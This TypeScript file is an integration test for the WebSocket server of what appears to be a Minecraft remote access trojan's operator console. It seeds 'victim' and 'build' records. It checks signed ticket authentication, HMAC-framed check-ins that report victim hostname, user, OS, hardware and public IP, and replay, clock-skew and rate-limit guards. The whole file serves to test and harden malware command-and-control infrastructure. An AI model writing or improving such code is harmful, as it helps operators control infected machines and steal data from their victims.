// Manual T2 integration check: WS auth, ticket lifecycle, HMAC, supersede and guard.
// Run from console/: npx tsx tests/ws-check.ts
import 'dotenv/config';
import { spawn } from 'node:child_process';
import { createHash, createHmac, hkdfSync, randomBytes, randomUUID } from 'node:crypto';
import { PrismaClient } from '@prisma/client';
import WebSocket from 'ws';
import { sealSecret } from '../server/lib/crypto';
import { signSession } from '../server/lib/jwt';

const PORT = 4100;
const BASE = `http://127.0.0.1:${PORT}`;
const prisma = new PrismaClient();
let pass = 0;
let fail = 0;

function check(name: string, ok: boolean, detail = ''): void {
  if (ok) {
    pass++;
    console.log(`PASS ${name}`);
  } else {
    fail++;
    console.log(`FAIL ${name} ${detail}`);
  }
}

function signature(token: string, method: string, path: string, body: Buffer): Record<string, string> {
  const ts = String(Math.floor(Date.now() / 1000));
  const nonce = randomBytes(16).toString('base64url');
  const canonical = [method.toUpperCase(), path, ts, nonce, createHash('sha256').update(body).digest('hex')].join('\n') + '\n';
  const sig = createHmac('sha256', Buffer.from(token, 'base64url')).update(canonical).digest('base64url');
  return { 'x-timestamp': ts, 'x-nonce': nonce, 'x-signature': sig };
}

async function ticket(victimId: string, token: string): Promise<Response> {
  const headers = signature(token, 'POST', '/api/v1/ws-ticket', Buffer.alloc(0));
  headers['x-victim-id'] = victimId;
  return fetch(`${BASE}/api/v1/ws-ticket`, { method: 'POST', headers });
}

type Opened = { ws: WebSocket; frames: any[]; closed: Promise<{ code: number; reason: string }> };

function open(url: string, cookie?: string): Promise<Opened> {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(url, cookie ? { headers: { cookie } } : {});
    const frames: any[] = [];
    let settle: (value: { code: number; reason: string }) => void;
    const closed = new Promise<{ code: number; reason: string }>((done) => (settle = done));
    ws.on('message', (data) => {
      try {
        frames.push(JSON.parse(String(data)));
      } catch {
        frames.push({ raw: String(data) });
      }
    });
    ws.on('close', (code, reason) => settle({ code, reason: reason.toString() }));
    ws.on('error', () => undefined);
    ws.once('open', () => resolve({ ws, frames, closed }));
    ws.once('unexpected-response', (_req, res) => reject(new Error(`http ${res.statusCode}`)));
  });
}

function nonce(): string {
  return randomBytes(16).toString('base64url');
}

function frame(type: string, seq: number, key: Buffer, fields: Record<string, unknown> = {}, opts: { id?: string; ts?: number; nonce?: string } = {}): string {
  const order = ['reply_to', 'hostname', 'user', 'os', 'cpu', 'ram', 'gpu', 'resolution', 'java', 'agent', 'public_ip', 'path', 'first', 'expect_seq_in', 'code', 'reason'];
  const id = opts.id ?? randomUUID();
  const frameNonce = opts.nonce ?? nonce();
  let payload = `{"v":1,"id":"${id}","seq":${seq},"ts":${opts.ts ?? Math.floor(Date.now() / 1000)},"type":"${type}","nonce":"${frameNonce}"`;
  for (const field of order) {
    if (!(field in fields)) continue;
    const value = fields[field];
    payload += `,"${field}":${typeof value === 'string' ? JSON.stringify(value) : String(value)}`;
  }
  const input = Buffer.concat([Buffer.from(String(seq)), Buffer.from([0x1f]), Buffer.from(frameNonce), Buffer.from([0x1f]), Buffer.from(payload)]);
  return `${payload},"sig":"${createHmac('sha256', key).update(input).digest('base64url')}"}`;
}

function keys(ticketValue: string, nonceValue: string): { c2a: Buffer; a2c: Buffer } {
  const secret = Buffer.from(ticketValue, 'base64url');
  const salt = Buffer.from(nonceValue, 'base64url');
  return {
    c2a: Buffer.from(hkdfSync('sha256', secret, salt, Buffer.from('spc-ws-v1/c2a'), 32)),
    a2c: Buffer.from(hkdfSync('sha256', secret, salt, Buffer.from('spc-ws-v1/a2c'), 32))
  };
}

async function handshake(ws: WebSocket, ticketValue: string, helloNonce: string): Promise<any> {
  const k = keys(ticketValue, helloNonce);
  const helloOk = await new Promise<any>((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error('no hello_ok')), 5000);
    ws.once('message', (data) => {
      clearTimeout(timer);
      resolve(JSON.parse(String(data)));
    });
  });
  const base = Number(helloOk.expect_seq_in ?? 0);
  ws.send(frame('ack', base + 1, k.a2c, { reply_to: helloOk.id }));
  ws.send(frame('hello', base + 2, k.a2c, {
    hostname: 'test-host', user: 'tester', os: 'linux', cpu: 'x', ram: '1', gpu: 'none',
    resolution: '0x0', java: '17', agent: '0.3.6', public_ip: 'unknown', path: '/tmp', first: true,
    expect_seq_in: helloOk.seq
  }));
  return helloOk;
}

async function waitFor(frames: any[], predicate: (f: any) => boolean, ms = 5000): Promise<any> {
  const start = Date.now();
  while (Date.now() - start < ms) {
    const hit = frames.find(predicate);
    if (hit) return hit;
    await new Promise((resolve) => setTimeout(resolve, 30));
  }
  return null;
}

async function main(): Promise<void> {
  const server = spawn('npx', ['tsx', 'server/index.ts'], {
    cwd: '/home/surrender/x/minecraft-rat/console',
    env: { ...process.env, PORT: String(PORT), LOG_DIR: '/tmp/opencode/t2logs' },
    stdio: ['ignore', 'ignore', 'ignore']
  });
  for (let i = 0; i < 100; i++) {
    try {
      const res = await fetch(`${BASE}/api/console/health`);
      if (res.ok) break;
    } catch {
      // not up yet
    }
    await new Promise((resolve) => setTimeout(resolve, 100));
  }

  const build = await prisma.build.create({
    data: { name: 'ws-check', version: '0', profile: 'full', buildId: randomUUID(), tokenHash: randomBytes(16).toString('hex'), secret: randomBytes(32).toString('base64url'), config: {} }
  });
  const tokenA = randomBytes(32).toString('base64url');
  const tokenB = randomBytes(32).toString('base64url');
  const victimA = await prisma.victim.create({ data: { buildId: build.id, hostname: 'ws-a', os: 'linux', username: 'a', deviceTokenEnc: sealSecret(tokenA) } });
  const victimB = await prisma.victim.create({ data: { buildId: build.id, hostname: 'ws-b', os: 'linux', username: 'b', deviceTokenEnc: sealSecret(tokenB) } });
  const operator = await prisma.operator.create({ data: { email: `ws-check-${randomUUID()}@x`, passwordHash: 'x', totpSecret: 'x' } });
  const sessionToken = await signSession(operator.id, operator.role, randomUUID());
  const sessionId = (JSON.parse(Buffer.from(sessionToken.split('.')[1]!, 'base64url').toString()) as { sid: string }).sid;
  await prisma.session.create({ data: { id: sessionId, operatorId: operator.id, tokenHash: randomUUID(), expiresAt: new Date(Date.now() + 600_000) } });

  try {
    const first = await ticket(victimA.id, tokenA);
    const body1 = await first.json() as any;
    check('ticket 201', first.status === 201, String(first.status));
    check('ticket shape', typeof body1.ticket === 'string' && body1.ticket.length === 43 && body1.expires_in === 30 && typeof body1.handshake_nonce === 'string' && body1.device_id === victimA.id);

    const unsigned = await fetch(`${BASE}/api/v1/ws-ticket`, { method: 'POST' });
    check('ticket needs signature', unsigned.status === 401, String(unsigned.status));

    const foreign = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${body1.ticket}&device_id=${victimB.id}`);
    check('foreign device 4401', (await foreign.closed).code === 4401);
    const reused = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${body1.ticket}&device_id=${victimA.id}`);
    check('reused ticket 4401', (await reused.closed).code === 4401);

    const unknown = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${'A'.repeat(43)}&device_id=${victimA.id}`);
    check('unknown ticket 4401', (await unknown.closed).code === 4401);

    const plain = await fetch(`${BASE}/api/v1/ws`);
    check('plain GET is 426', plain.status === 426, String(plain.status));

    const good = await ticket(victimA.id, tokenA);
    const goodBody = await good.json() as any;
    const session = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${goodBody.ticket}&device_id=${victimA.id}&expect_seq_in=0`);
    const k = keys(goodBody.ticket, goodBody.handshake_nonce);
    const helloOk = await handshake(session.ws, goodBody.ticket, goodBody.handshake_nonce);
    check('hello_ok first frame', helloOk.type === 'hello_ok' && helloOk.expect_seq_in === 0 && helloOk.expect_seq_out === 0);
    const helloAck = await waitFor(session.frames, (f) => f.type === 'ack');
    check('hello acked', Boolean(helloAck));

    const ping = frame('ping', Number(helloOk.expect_seq_in ?? 0) + 3, k.a2c);
    session.ws.send(ping);
    const pong = await waitFor(session.frames, (f) => f.type === 'pong');
    check('ping answered with pong', Boolean(pong));

    session.ws.send(ping);
    const pong2 = await waitFor(session.frames, (f) => f.type === 'pong' && f.reply_to === pong?.reply_to);
    check('duplicate ping re-answered', Boolean(pong2));

    const badTicket = await (await ticket(victimA.id, tokenA)).json() as any;
    const bad = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${badTicket.ticket}&device_id=${victimA.id}`);
    const badHello = await handshake(bad.ws, badTicket.ticket, badTicket.handshake_nonce);
    bad.ws.send(frame('ping', Number(badHello.expect_seq_in ?? 0) + 3, Buffer.from('x'.repeat(32))));
    check('bad HMAC 4401', (await bad.closed).code === 4401, JSON.stringify(await bad.closed));

    const skewTicket = await (await ticket(victimA.id, tokenA)).json() as any;
    const skew = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${skewTicket.ticket}&device_id=${victimA.id}`);
    const skewHello = await handshake(skew.ws, skewTicket.ticket, skewTicket.handshake_nonce);
    skew.ws.send(frame('ping', Number(skewHello.expect_seq_in ?? 0) + 3, keys(skewTicket.ticket, skewTicket.handshake_nonce).a2c, {}, { ts: Math.floor(Date.now() / 1000) - 400 }));
    check('clock skew 4400', (await skew.closed).code === 4400);

    const nonceTicket = await (await ticket(victimA.id, tokenA)).json() as any;
    const replay = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${nonceTicket.ticket}&device_id=${victimA.id}`);
    const replayHello = await handshake(replay.ws, nonceTicket.ticket, nonceTicket.handshake_nonce);
    const replayKey = keys(nonceTicket.ticket, nonceTicket.handshake_nonce).a2c;
    const sharedNonce = nonce();
    const replayBase = Number(replayHello.expect_seq_in ?? 0) + 3;
    replay.ws.send(frame('ping', replayBase, replayKey, {}, { nonce: sharedNonce }));
    replay.ws.send(frame('ping', replayBase + 1, replayKey, {}, { nonce: sharedNonce }));
    check('repeated nonce 4400', (await replay.closed).code === 4400);

    const timeoutTicket = await (await ticket(victimA.id, tokenA)).json() as any;
    const slow = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${timeoutTicket.ticket}&device_id=${victimA.id}`);
    check('handshake timeout 4408', (await slow.closed).code === 4408);

    const retire = session.closed;
    const supersedeTicket = await (await ticket(victimA.id, tokenA)).json() as any;
    const newer = await open(`ws://127.0.0.1:${PORT}/api/v1/ws?ticket=${supersedeTicket.ticket}&device_id=${victimA.id}`);
    check('superseded 4409', (await retire).code === 4409);
    newer.ws.close();

    const consoleWs = await open(`ws://127.0.0.1:${PORT}/api/console/ws`);
    check('console ws 4401 without session', (await consoleWs.closed).code === 4401);

    const authedWs = await open(`ws://127.0.0.1:${PORT}/api/console/ws`, `spc_session=${sessionToken}`);
    const hello = await waitFor(authedWs.frames, (f) => f.type === 'hello');
    check('console ws hello with session', Boolean(hello), JSON.stringify(authedWs.frames));
    authedWs.ws.close();

    // Ticket route overrides the global 600/min with 12/min per device.
    const limited = await ticket(victimB.id, tokenB);
    check('ticket limit replaces global', limited.headers.get('x-ratelimit-limit') === '12', String(limited.headers.get('x-ratelimit-limit')));
    const statuses = [limited.status];
    for (let i = 0; i < 12; i++) statuses.push((await ticket(victimB.id, tokenB)).status);
    check('13th ticket 429', statuses.filter((status) => status === 429).length >= 1, statuses.join(','));
  } finally {
    server.kill('SIGTERM');
    setTimeout(() => server.kill('SIGKILL'), 2000).unref();
    await prisma.session.deleteMany({ where: { operatorId: operator.id } });
    await prisma.operator.delete({ where: { id: operator.id } });
    await prisma.victim.deleteMany({ where: { id: { in: [victimA.id, victimB.id] } } });
    await prisma.build.delete({ where: { id: build.id } });
    await prisma.$disconnect();
  }
  console.log(`${pass} passed, ${fail} failed`);
  process.exit(fail === 0 ? 0 : 1);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
